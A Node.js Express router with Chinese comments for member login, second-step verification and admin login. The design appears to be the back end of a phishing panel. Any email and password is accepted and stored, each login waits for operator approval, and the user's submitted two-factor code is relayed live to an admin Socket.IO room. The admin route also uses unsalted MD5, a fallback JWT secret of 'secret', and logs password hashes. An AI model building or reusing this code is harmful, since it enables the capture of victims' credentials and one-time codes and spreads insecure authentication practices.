const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const { createConnection } = require('../utils/db');
const router = express.Router();

module.exports = (io) => {
  console.log('路由模块初始化');
  console.log(`Socket.IO对象: ${io ? '已定义' : '未定义'}`);
  // 会员登录
  router.post('/member/login', async (req, res) => {
    // 创建数据库连接
    let db = null;
    try {
      db = await createConnection();
      const { email, password } = req.body;
      const clientIP = req.ip || req.connection.remoteAddress;

      // 检查IP是否被禁止
      const [bannedIPs] = await db.execute(
        'SELECT * FROM ip_blacklist WHERE ip_address = ? AND status = "active"',
        [clientIP]
      );

      if (bannedIPs.length > 0) {
        return res.status(403).json({ 
          error: req.t('ip_banned'),
          reason: bannedIPs[0].reason || req.t('ip_banned_default_reason')
        });
      }

      // 检查会员是否存在，不存在则自动注册
      let [members] = await db.execute('SELECT * FROM members WHERE email = ?', [email]);
      let member;

      if (members.length === 0) {
        // 自动注册新会员
        const hashedPassword = await bcrypt.hash(password, 10);
        const [result] = await db.execute(
          'INSERT INTO members (email, password) VALUES (?, ?)',
          [email, hashedPassword]
        );
        member = { id: result.insertId, email, password: hashedPassword };
      } else {
        member = members[0];
        // 验证密码
        const validPassword = await bcrypt.compare(password, member.password);
        if (!validPassword) {
          return res.status(400).json({ error: req.t('invalid_credentials') });
        }
      }

      // 记录登录日志
      const [loginResult] = await db.execute(
        'INSERT INTO login_logs (member_id, ip_address) VALUES (?, ?)',
        [member.id, clientIP]
      );

      // 通知管理员有新的登录请求
      io.to('admin').emit('new-login-request', {
        id: loginResult.insertId,
        member_id: member.id,
        email: member.email,
        ip_address: clientIP,
        login_time: new Date()
      });

      res.json({
        message: req.t('login_pending_approval'),
        loginId: loginResult.insertId,
        memberId: member.id
      });

    } catch (error) {
      console.error('登录错误:', error);
      res.status(500).json({ error: req.t('server_error') });
    } finally {
      // 关闭数据库连接
      if (db) {
        try {
          await db.end();
        } catch (err) {
          console.error('关闭数据库连接失败:', err);
        }
      }
    }
  });

  // 提交二次验证码
  router.post('/member/verify', async (req, res) => {
    // 创建数据库连接
    let db = null;
    try {
      db = await createConnection();
      const { loginId, verificationCode } = req.body;

      // 获取登录记录
      const [loginLogs] = await db.execute(
        'SELECT * FROM login_logs WHERE id = ? AND status = "approved"',
        [loginId]
      );

      if (loginLogs.length === 0) {
        return res.status(400).json({ error: req.t('invalid_login_session') });
      }

      const loginLog = loginLogs[0];

      // 记录二次验证
      const [verifyResult] = await db.execute(
        'INSERT INTO second_verifications (member_id, login_log_id, verification_code) VALUES (?, ?, ?)',
        [loginLog.member_id, loginId, verificationCode]
      );

      // 通知管理员有新的验证请求
      const [members] = await db.execute('SELECT email FROM members WHERE id = ?', [loginLog.member_id]);
      io.to('admin').emit('new-verification-request', {
        id: verifyResult.insertId,
        member_id: loginLog.member_id,
        email: members[0].email,
        verification_code: verificationCode,
        submitted_at: new Date()
      });

      res.json({
        message: req.t('verification_pending_approval'),
        verificationId: verifyResult.insertId
      });

    } catch (error) {
      console.error('验证错误:', error);
      res.status(500).json({ error: req.t('server_error') });
    } finally {
      // 关闭数据库连接
      if (db) {
        try {
          await db.end();
        } catch (err) {
          console.error('关闭数据库连接失败:', err);
        }
      }
    }
  });

  // 管理员登录
  router.post('/admin/login', async (req, res) => {
    // 创建数据库连接
    let db = null;
    try {
      console.log('管理员登录请求开始处理');
      const { username, password } = req.body;
      console.log(`尝试登录的管理员用户名: ${username}`);
      
      // 创建新的数据库连接
      console.log('创建新的数据库连接...');
      db = await createConnection();
      console.log('数据库连接成功');
      
      // 准备SQL语句
      const sql = 'SELECT * FROM admins WHERE username = ?';
      const params = [username];
      console.log(`准备执行SQL: ${sql}, 参数: ${JSON.stringify(params)}`);
      
      const [admins] = await db.execute(sql, params);
      console.log(`查询结果: 找到 ${admins.length} 个匹配的管理员账号`);
      
      if (admins.length === 0) {
        console.log('未找到匹配的管理员账号');
        return res.status(400).json({ error: req.t ? req.t('invalid_credentials') : '用户名或密码错误' });
      }

      const admin = admins[0];
      console.log(`找到管理员账号: ID=${admin.id}, 用户名=${admin.username}, 密码哈希=${admin.password}`);
      
      // 使用MD5验证密码
      const md5Password = crypto.createHash('md5').update(password).digest('hex');
      console.log(`输入密码的MD5: ${md5Password}`);
      console.log(`数据库中的密码: ${admin.password}`);
      
      const validPassword = (md5Password === admin.password);
      console.log(`密码验证结果: ${validPassword ? '成功' : '失败'}`);
      
      if (!validPassword) {
        return res.status(400).json({ error: req.t ? req.t('invalid_credentials') : '用户名或密码错误' });
      }

      console.log('生成JWT令牌');
      const token = jwt.sign(
        { id: admin.id, username: admin.username, role: 'admin' },
        process.env.JWT_SECRET || 'secret',
        { expiresIn: '24h' }
      );

      console.log('管理员登录成功');
      res.json({
        token,
        admin: { id: admin.id, username: admin.username }
      });
    } catch (error) {
      console.error('管理员登录错误:', error);
      console.error('错误堆栈:', error.stack);
      res.status(500).json({ error: req.t ? req.t('server_error') : '服务器错误，请稍后重试' });
    } finally {
      // 关闭数据库连接
      if (db) {
        try {
          await db.end();
        } catch (err) {
          console.error('关闭数据库连接失败:', err);
        }
      }
    }
  });

  return router;
};